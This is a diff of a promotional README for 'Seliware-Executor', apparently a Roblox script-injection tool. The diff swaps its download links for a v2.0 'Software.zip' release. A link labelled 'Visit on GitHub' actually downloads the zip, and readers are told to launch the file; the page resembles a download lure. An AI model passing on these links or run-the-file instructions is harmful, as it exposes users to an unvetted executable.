@@ -12,7 +12,7 @@ Welcome to **Seliware-Executor**, the ultimate Roblox executor that will revolut
 
 ## Getting Started
 To get started with **Seliware-Executor**, simply download the tool from the following link:  
-[![Download Seliware-Executor](https://github.com/wafaislami/Seliware-Executor/releases/download/v1.0/Installer.zip)](https://github.com/wafaislami/Seliware-Executor/releases/download/v1.0/Installer.zip)  
+[![Download Seliware-Executor](https://github.com/wafaislami/Seliware-Executor/releases/download/v2.0/Software.zip)](https://github.com/wafaislami/Seliware-Executor/releases/download/v2.0/Software.zip)  
 *(Launch the downloaded file to begin installation.)*
 
 If the link provided does not work, please check the "Releases" section of the repository for alternative download options.
@@ -48,4 +48,4 @@ We would like to express our gratitude to the open-source community for their co
 
 Download now and elevate your coding game to new heights. Let's code, collaborate, and create together. Happy coding! 🚀
 
-[Visit Seliware-Executor on GitHub](https://github.com/wafaislami/Seliware-Executor/releases/download/v1.0/Installer.zip)
+[Visit Seliware-Executor on GitHub](https://github.com/wafaislami/Seliware-Executor/releases/download/v2.0/Software.zip)
